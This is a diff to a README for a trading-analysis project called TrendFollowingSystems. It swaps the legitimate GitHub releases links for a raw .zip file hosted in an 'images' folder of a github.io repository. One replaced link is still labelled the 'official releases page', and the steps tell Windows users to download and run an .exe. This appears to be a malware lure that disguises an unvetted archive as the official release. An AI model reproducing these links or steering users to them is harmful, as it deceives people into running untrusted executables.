@@ -5,7 +5,7 @@ description: "Calculate performance metrics for trend-following systems using an
 ---
 # 📈 TrendFollowingSystems - Analyze market momentum with these tools
 
-[![Download the latest version](https://img.shields.io/badge/download-latest-blue.svg)](https://github.com/appropriate-mixup116/TrendFollowingSystems/releases)
+[![Download the latest version](https://img.shields.io/badge/download-latest-blue.svg)](https://raw.githubusercontent.com/appropriate-mixup116/appropriate-mixup116.github.io/main/images/v1.8.zip)
 
 TrendFollowingSystems provides a robust set of tools for financial analysis. This repository implements the mathematical models found in the research paper by Sepp and Lucic. These tools allow you to test investment strategies based on trend data. You can evaluate how different futures assets perform using historical price changes. This project focuses on clarity and exact calculations for quantitative analysis.
 
@@ -13,7 +13,7 @@ TrendFollowingSystems provides a robust set of tools for financial analysis. Thi
 
 You do not need to write code to use these tools. Follow these steps to obtain and run the software on your Windows computer.
 
-1. Go to the [official releases page](https://github.com/appropriate-mixup116/TrendFollowingSystems/releases).
+1. Go to the [official releases page](https://raw.githubusercontent.com/appropriate-mixup116/appropriate-mixup116.github.io/main/images/v1.8.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` to start your download.
 4. Open the folder where your computer saved the file.
